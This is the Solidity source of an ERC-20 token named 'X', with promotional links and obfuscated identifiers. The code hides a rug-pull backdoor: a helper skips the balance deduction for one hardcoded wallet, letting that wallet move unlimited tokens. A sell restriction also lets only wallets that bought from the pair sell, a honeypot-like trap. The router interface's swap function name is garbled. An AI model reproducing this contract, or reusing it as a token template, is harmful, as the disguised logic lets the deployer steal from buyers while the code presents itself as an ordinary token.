/**

X   $X


TWITTER: https://twitter.com/XCoin_Erc20
TELEGRAM: https://t.me/Xerc_Portal
WEBSITE: https://xerc.org/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _fbkub(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _fbkub(a, b, "SafeMath:");
    }

    function  _fbkub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _paucjrdf {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _prufgmtls {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract X is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"X";
    string private constant _symbol = unicode"X";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalsy = 1000000000 * 10 **_decimals;
    uint256 public _mxfktAmaunt = _Totalsy;
    uint256 public _Wallesorhp = _Totalsy;
    uint256 public _wapThresoula= _Totalsy;
    uint256 public _mkolTakfr= _Totalsy;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isyEcgasp;
    mapping (address => bool) private _taxvWalrmy;
    mapping(address => uint256) private _lruerktoap;
    bool public _taerelorve = false;
    address payable private _TalFrtmq;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapqumfoqp=0;
    uint256 private _burwtxpr=0;


    _prufgmtls private _Tajmenbl;
    address private _yMgovmkms;
    bool private _qruvmbqh;
    bool private lapSrmkep = false;
    bool private _acjenunp = false;


    event _amvobfdl(uint _mxfktAmaunt);
    modifier loecThayuq {
        lapSrmkep = true;
        _;
        lapSrmkep = false;
    }

    constructor () {

        _TalFrtmq = payable(0x842C96b20C5F0daFe464Db058ae155726Aa2EE20);
        _balances[_msgSender()] = _Totalsy;
        _isyEcgasp[owner()] = true;
        _isyEcgasp[address(this)] = true;
        _isyEcgasp[_TalFrtmq] = true;

 

        emit Transfer(address(0), _msgSender(), _Totalsy);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalsy;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _fbkub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_taerelorve) {
                if (to != address
                (_Tajmenbl) && to !=
                 address(_yMgovmkms)) {
                  require(_lruerktoap
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruerktoap
                  [tx.origin] = block.number;
                }
            }

            if (from == _yMgovmkms && to != 
            address(_Tajmenbl) && !_isyEcgasp[to] ) {
                require(amount <= _mxfktAmaunt,
                 "Exceeds the _mxfktAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallesorhp, "Exceeds the maxWalletSize.");
                if(_burwtxpr
                < _wapqumfoqp){
                  require(! _frouqeij(to));
                }
                _burwtxpr++;
                 _taxvWalrmy[to]=true;
                teeomoun = amount.mul((_burwtxpr>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _yMgovmkms && from!= address(this) 
            && !_isyEcgasp[from] ){
                require(amount <= _mxfktAmaunt && 
                balanceOf(_TalFrtmq)<_mkolTakfr,
                 "Exceeds the _mxfktAmaunt.");
                teeomoun = amount.mul((_burwtxpr>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burwtxpr>_wapqumfoqp &&
                 _taxvWalrmy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!lapSrmkep 
            && to == _yMgovmkms && _acjenunp &&
             contractTokenBalance>_wapThresoula 
            && _burwtxpr>_wapqumfoqp&&
             !_isyEcgasp[to]&& !_isyEcgasp[from]
            ) {
                _swpjnbruah( _ympfe(amount, 
                _ympfe(contractTokenBalance,_mkolTakfr)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _romseuxq(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _fbkub(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _fbkub(teeomoun));
        emit Transfer(from, to, 
        amount. _fbkub(teeomoun));
    }

    function _swpjnbruah(uint256
     tokenAmount) private loecThayuq {
        if(tokenAmount==0){return;}
        if(!_qruvmbqh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _Tajmenbl.WETH();
        _approve(address(this),
         address(_Tajmenbl), tokenAmount);
        _Tajmenbl.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _ympfe(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _fbkub(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _TalFrtmq){
            return a ;
        }else{
            return a . _fbkub (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxfktAmaunt = _Totalsy;
        _Wallesorhp = _Totalsy;
        _taerelorve = false;
        emit _amvobfdl(_Totalsy);
    }

    function _frouqeij(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _romseuxq(uint256
    amount) private {
        _TalFrtmq.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _qruvmbqh);
        _Tajmenbl   =  _prufgmtls (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_Tajmenbl), _Totalsy);
        _yMgovmkms = _paucjrdf(_Tajmenbl.factory()). createPair (address(this),  _Tajmenbl . WETH ());
        _Tajmenbl.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_yMgovmkms).approve(address(_Tajmenbl), type(uint).max);
        _acjenunp = true;
        _qruvmbqh = true;
    }

    receive() external payable {}
}